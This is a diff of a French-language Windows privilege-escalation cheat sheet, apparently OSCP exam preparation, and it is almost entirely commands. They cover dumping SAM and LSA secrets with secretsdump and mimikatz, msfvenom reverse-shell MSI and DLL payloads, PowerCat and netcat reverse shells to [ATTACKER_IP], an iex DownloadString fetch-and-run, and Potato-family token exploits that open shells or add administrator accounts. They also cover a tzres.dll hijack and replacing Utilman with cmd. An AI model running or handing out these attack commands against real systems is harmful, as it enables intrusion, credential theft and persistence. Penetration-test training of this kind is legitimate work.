 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
@@ -1804,7 +1452,6 @@ impacket-secretsdump -security <security_file> -system <system_file> LOCAL
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -1812,18 +1459,14 @@ mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
 
 ```
 
-
 ### Extraire des données d’authentification utilisateur depuis NTUSER.dat
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 **Paramètres et repères :**
 `NTUSER.dat`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Users\&lt;username&gt;\NTUSER.dat</code></p>
-
 
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
@@ -1832,37 +1475,26 @@ reg load hku\TempHive <path_to_ntuser.dat>
 
 ```
 
-
 ### Accéder aux copies instantanées de volume (VSS)
-
-
-
 
 ```powershell
 vssadmin list shadows
 
 ```
 
-
-
-
 ```powershell
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
 
 ```
 
-
 ## Vérifier AlwaysInstallElevated dans le Registre
 
 Observer les permissions et la configuration de Windows.
 
-
 **Paramètres et repères :**
 `HKEY_LOCAL_MACHINE` · `HKEY_CURRENT_USER` · `1`  
 
-
 ### Comment vérifier la vulnérabilité
-
 
 <p class="oscp-command-note">Registre : vérifier les politiques AlwaysInstallElevated.</p>
 
@@ -1875,20 +1507,15 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 
 ```
 
-
 ### Interpréter les résultats
-
 
 **Paramètres et repères :**
 `1`  
-
 
 ### Exploiter la configuration vulnérable
 
-
 **Paramètres et repères :**
 `1`  
-
 
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
@@ -1896,7 +1523,6 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f msi -o malicious.msi
 
 ```
-
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
@@ -1914,10 +1540,8 @@ run
 
 ```
 
-
 **Paramètres et repères :**
 `msiexec`  
-
 
 <p class="oscp-command-note">Windows : lancer un package MSI avec msiexec ; ne pas traiter le fichier comme une commande Linux.</p>
 
@@ -1928,29 +1552,22 @@ run
 msiexec.exe /i .\malicious.msi /qn
 ```
 
-
 ### WinPEAS
-
-
-
 
 ```powershell
 .\winPEAS.ps1
 
 ```
 
-
 ```powershell
 .\winPEAS.ps1 | tee winpeas_output.txt
 
 ```
 
-
 ```powershell
 .\winPEAS.ps1 | Out-File -FilePath winpeas_output.txt
 
 ```
-
 
 <p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>
 
@@ -1968,93 +1585,71 @@ python3 json2pdf.py peass.json peass.pdf
 
 ```
 
-
-
-
 ```powershell
 Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 
 ```
 
-
 ### PowerUp
-
-
-
 
 ```powershell
 .\powerup.ps1
 
 ```
 
-
 ```powershell
 .\PowerUp.ps1 -CheckMissingPatches
 
 ```
-
 
 ```powershell
 .\PowerUp.ps1 -UnquotedServicePaths
 
 ```
 
-
 ```powershell
 .\PowerUp.ps1 -CheckWritableServices
 
 ```
-
 
 ```powershell
 .\PowerUp.ps1 -ScheduledTasks
 
 ```
 
-
 ```powershell
 .\PowerUp.ps1 -WeakFilePermissions
 
 ```
-
 
 ```powershell
 .\PowerUp.ps1 -AutoDownloadBinaries
 
 ```
 
-
 ### PowerCat
-
-
-
 
 ```powershell
 .\powercat.ps1 -c [target_IP] -p [port] -e [command]
 
 ```
 
-
 ```powershell
 .\powercat.ps1 -c [attacker_IP] -p [port] -e powershell.exe
 
 ```
-
 
 ```powershell
 .\powercat.ps1 -c [ATTACKER_IP] -p [PORT] -f [FILE_TO_SEND]
 
 ```
 
-
 ```powershell
 .\powercat.ps1 -c [TARGET_IP] -p [PORT] -s
 
 ```
 
-
 ### PowerView
-
 
 <p class="oscp-command-note">PowerView : charger le script PowerShell en vérifiant la politique d'exécution.</p>
 
@@ -2066,102 +1661,78 @@ Import-Module .\PowerView.ps1
 Get-Command Get-Domain -ErrorAction SilentlyContinue
 ```
 
-
 ```powershell
 .\PowerView.ps1 -Command "Get-NetUser"
 
 ```
-
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetGroup -GroupName "Domain Admins"'
 
 ```
 
-
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetUser -SPN'
 
 ```
-
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetDomainController'
 
 ```
 
-
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetShare'
 
 ```
-
 
 ```powershell
 .\PowerView.ps1 -Command 'Get-NetUser -Delegation'
 
 ```
 
-
 ### PowerMad
-
-
-
 
 ```powershell
 .\PowerMad.ps1
 
 ```
 
-
 ```powershell
 .\PowerMad.ps1 -Command "Get-DomainAdminGroup"
 
 ```
-
 
 ```powershell
 .\PowerMad.ps1 -Command "Get-DomainAdminGroup" | Out-File -FilePath powermad_output.txt
 
 ```
 
-
 ### PrivescCheck
 
-
-
-
 ```powershell
 .\PrivescCheck.ps1
 
 ```
 
-
 ```powershell
 .\PrivescCheck.ps1
 
 ```
-
 
 ```powershell
 .\PrivescCheck.ps1 | Out-File -FilePath privesccheck_output.txt
 
 ```
 
-
 ### Seatbelt
-
-
-
 
 ```powershell
 .\Seatbelt.exe
 
 ```
 
-
 #### Installation
-
 
 <p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
 
@@ -2171,20 +1742,13 @@ cd PowerSharpPack
 
 ```
 
-
-
-
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
 
 ```
 
-
 **Paramètres et repères :**
 `-Command`  
-
-
-
 
 ```powershell
 # Examiner la propriété AMSIProviders avec Seatbelt
@@ -2192,24 +1756,18 @@ PowerSharpPack -seatbelt -Command "AMSIProviders"
 
 ```
 
-
 #### Outils et exemples de code inclus
-
-
-
 
 ```powershell
 PowerSharpPack -InternalMonologue
 
 ```
 
-
 ```powershell
 # Examiner la propriété AMSIProviders avec Seatbelt
 PowerSharpPack -seatbelt -Command "AMSIProviders"
 
 ```
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2217,13 +1775,11 @@ PowerSharpPack -SharpWeb
 
 ```
 
-
 ```powershell
 # Examiner un module PowerSharpPack
 PowerSharpPack -UrbanBishop
 
 ```
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2231,13 +1787,11 @@ PowerSharpPack -SharpUp
 
 ```
 
-
 ```powershell
 # Examiner la propriété kerberoast avec Seatbelt
 PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
 
 ```
-
 
 ```powershell
 # Examiner la propriété Persist avec Seatbelt
@@ -2245,13 +1799,11 @@ PowerSharpPack -SharPersist -Command "Persist"
 
 ```
 
-
 ```powershell
 # Examiner la propriété Get-Domain avec Seatbelt
 PowerSharpPack -SharpView -Command "Get-Domain"
 
 ```
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2259,22 +1811,16 @@ PowerSharpPack -winPEAS
 
 ```
 
-
 ```powershell
 # Examiner un module PowerSharpPack
 PowerSharpPack -SharpChromium
 
 ```
 
-
 #### Scripts autonomes
-
 
 **Paramètres et repères :**
 `PowerSharpBinaries`  
-
-
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2282,13 +1828,11 @@ PowerSharpPack -SharpCloud
 
 ```
 
-
 ```powershell
 # Examiner un module PowerSharpPack
 PowerSharpPack -SharpGPOAbuse
 
 ```
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2296,17 +1840,12 @@ PowerSharpPack -SauronEye
 
 ```
 
-
 #### Outils complémentaires
-
-
-
 
 ```powershell
 PowerSharpPack -SharpShares
 
 ```
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2314,13 +1853,11 @@ PowerSharpPack -SharpSniper
 
 ```
 
-
 ```powershell
 # Examiner un module PowerSharpPack
 PowerSharpPack -SharpSpray
 
 ```
-
 
 ```powershell
 # Examiner un module PowerSharpPack
@@ -2328,29 +1865,21 @@ PowerSharpPack -Grouper2
 
 ```
 
-
 ```powershell
 # Examiner un module PowerSharpPack
 PowerSharpPack -Watson
 
 ```
 
-
 #### Conseils d’exécution
-
-
-
 
 ```powershell
 PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example.com"
 
 ```
 
-
 **Paramètres et repères :**
 `PowerSharpBinaries`  
-
-
 
 ### Vérification des deux branches
 
@@ -2365,7 +1894,6 @@ reg query 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v AlwaysInstallE
 
 ## Outils d’usurpation de jeton (famille Potato)
 
-
 <p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Outils d’usurpation de jeton (famille Potato)».</p>
 
 ```text
@@ -2373,36 +1901,25 @@ whoami /priv
 
 ```
 
-
 **Paramètres et repères :**
 `winPEAS`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Compte système Windows :</strong> <code>NT AUTHORITY\SYSTEM</code></p>
-
 
 **Paramètres et repères :**
 `PrintSpoofer`  
 
-
 ### DCOMPotato
-
-
-
 
 ```bash
 DCOMPotato.exe -c "C:\Windows\System32\cmd.exe"
 
 ```
 
-
 ```bash
 DCOMPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2413,23 +1930,17 @@ DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /a
 
 ```
 
-
 ### EfsPotato
-
-
-
 
 ```bash
 EfsPotato.exe "C:\Windows\System32\cmd.exe"
 
 ```
 
-
 ```bash
 EfsPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2440,23 +1951,17 @@ EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /ad
 
 ```
 
-
 ### GodPotato
-
-
-
 
 ```bash
 GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
 
 ```
 
-
 ```bash
 GodPotato.exe -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2467,23 +1972,17 @@ GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /
 
 ```
 
-
 ### Hot Potato (CVE-2016-3225)
-
-
-
 
 ```bash
 HotPotato.exe -ip -cmd "C:\Windows\System32\cmd.exe"
 
 ```
 
-
 ```bash
 HotPotato.exe -ip -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2494,23 +1993,17 @@ HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators em
 
 ```
 
-
 ### Juicy Potato
-
-
-
 
 ```bash
 JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
 
 ```
 
-
 ```bash
 JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2521,23 +2014,17 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgro
 
 ```
 
-
 ### PrintSpoofer
-
-
-
 
 ```bash
 PrintSpoofer.exe -c whoami
 
 ```
 
-
 ```bash
 PrintSpoofer.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2548,23 +2035,17 @@ PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma 
 
 ```
 
-
 ### Rogue Potato
-
-
-
 
 ```bash
 RoguePotato.exe -r [ATTACKER_IP] -e whoami
 
 ```
 
-
 ```bash
 RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2575,16 +2056,12 @@ RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Admi
 
 ```
 
-
 ### RottenPotato
-
 
 **Paramètres et repères :**
 `RottenPotato.exe`  
 
-
 ### SharpEfsPotato
-
 
 <p class="oscp-command-note">SharpEfsPotato : exécuter une commande de test et enregistrer le résultat.</p>
 
@@ -2596,14 +2073,12 @@ SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
 
 ```
 
-
 ```bash
 SharpEfsPotato.exe -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc.exe [kali_ip] [port] -e cmd.exe"
 # Autre possibilité
 SharpEfsPotato.exe -p "C:\Windows\System32\nc.exe" -a "-e cmd.exe [kali_ip] [port]"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2614,23 +2089,17 @@ SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrator
 
 ```
 
-
 ### SigmaPotato
-
-
-
 
 ```bash
 SigmaPotato.exe cmd.exe /c whoami
 
 ```
 
-
 ```bash
 SigmaPotato.exe --revshell [ATTACKER_IP] 4444
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2641,23 +2110,17 @@ SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"
 
 ```
 
-
 ### SweetPotato
-
-
-
 
 ```bash
 SweetPotato.exe -a whoami
 
 ```
 
-
 ```bash
 SweetPotato.exe -a "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```bash
 # Crée le compte utilisateur
@@ -2668,13 +2131,10 @@ SweetPotato.exe -a "C:\Windows\System32\net.exe localgroup Administrators emma /
 
 ```
 
-
 ### CVE-2023-29360
-
 
 **Paramètres et repères :**
 `CVE-2023-29360.exe`  
-
 
 <p class="oscp-command-note">Afficher les processus actifs.</p>
 
@@ -2699,27 +2159,20 @@ nt authority\system
 
 ```
 
-
 ### SeAssignPrimaryToken
-
 
 **Paramètres et repères :**
 `SeImpersonate` · `JuicyPotato` · `RoguePotato`  
-
-
-
 
 ```powershell
 JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
 
 ```
 
-
 ```powershell
 JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 ```
-
 
 ```powershell
 # Crée le compte utilisateur
@@ -2730,20 +2183,15 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgro
 
 ```
 
-
-
-
 ```powershell
 RoguePotato.exe -r [kali_ip] -e whoami
 
 ```
 
-
 ```powershell
 RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\nc.exe -e cmd.exe [kali_ip] [port]"
 
 ```
-
 
 ```powershell
 # Crée le compte utilisateur
@@ -2754,13 +2202,10 @@ RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administ
 
 ```
 
-
 ### SeBackup
-
 
 **Paramètres et repères :**
 `SeBackupPrivilege`  
-
 
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
@@ -2770,7 +2215,6 @@ reg save hklm\system c:\Temp\system
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```bash
@@ -2778,13 +2222,10 @@ impacket-secretsdump -system system -sam sam local
 
 ```
 
-
 ### SeDebug
-
 
 **Paramètres et repères :**
 `SeDebugPrivesc.exe`  
-
 
 <p class="oscp-command-note">Afficher les processus actifs.</p>
 
@@ -2793,46 +2234,32 @@ ps
 
 ```
 
-
-
-
 ```powershell
 .\SeDebugPrivesc.exe <PID> <Program and Arguments>
 
 ```
 
-
 ### SeImpersonate
-
 
 **Paramètres et repères :**
 `Disabled`  
 
-
 ### SeManageVolumeAbuse
-
-
-
 
 ```text
 C:\
 
 ```
 
-
 **Paramètres et repères :**
 `.dll`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\</code></p>
-
 
 **Paramètres et repères :**
 `SeManageVolumeExploit.exe`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
-
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
@@ -2841,7 +2268,6 @@ systeminfo
 
 ```
 
-
 ```powershell
 whoami /priv
 
@@ -2849,12 +2275,8 @@ whoami /priv
 
 ![Checking for SeManageVolume privilege.](https://www.emmanuelsolis.com/img/semanage_1.png)
 
-
 **Paramètres et repères :**
 `SeManageVolume`  
-
-
-
 
 ```powershell
 .\SeManageVolumeExploit.exe
@@ -2863,7 +2285,6 @@ whoami /priv
 
 ![Executing the exploit.](https://www.emmanuelsolis.com/img/semanage_2.png)
 
-
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
@@ -2871,9 +2292,7 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port
 
 ```
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
-
 
 <p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
@@ -2884,9 +2303,7 @@ iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll
 
 ![Replacing C:\Windows\System32\wbem\tzres.dll.](https://www.emmanuelsolis.com/img/semanage_3.png)
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
-
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
@@ -2895,7 +2312,6 @@ systeminfo
 
 ```
 
-
 ```powershell
 systeminfo
 
@@ -2903,13 +2319,10 @@ systeminfo
 
 ![Triggering the payload for a reverse shell.](https://www.emmanuelsolis.com/img/semanage_4.png)
 
-
 ### SeRestore
-
 
 **Paramètres et repères :**
 `utilman.exe` · `SeRestoreAbuse.exe`  
-
 
 <p class="oscp-command-note">Se placer dans le répertoire utilisé pour «SeRestore».</p>
 
@@ -2920,14 +2333,10 @@ ren Utilman.exe Utilman.old
 
 ```
 
-
-
-
 ```powershell
 ren cmd.exe Utilman.exe
 
 ```
-
 
 <p class="oscp-command-note">Actions distinctes : verrouiller Windows avec Win+L, puis utiliser un client RDP depuis Kali.</p>
 
@@ -2939,20 +2348,12 @@ ren cmd.exe Utilman.exe
 rdesktop <IP_WINDOWS>
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Compte système Windows :</strong> <code>nt authority\system</code></p>
-
-
-
 
 **Sur l’écran de connexion Windows :** `Win + U` est un **raccourci clavier** qui ouvre les options d’accessibilité. Ce texte ne doit pas être saisi dans un terminal.
 
-
 **Paramètres et repères :**
 `SerestoreAbuse.exe`  
-
 
 <p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
@@ -2960,7 +2361,6 @@ rdesktop <IP_WINDOWS>
 iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
 
 ```
-
 
 <p class="oscp-command-note">Préparer la charge utile sur Kali et appeler SeRestoreAbuse depuis le poste Windows autorisé.</p>
 
@@ -2981,7 +2381,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT_ECOUTE> -f
 ```powershell
 .\SeRestoreAbuse.exe "C:\temp\nc.exe <IP_KALI> <PORT_ECOUTE> -e powershell.exe"
 ```
-
 
 ## Traces d'exécution et configurations à contrôler
 
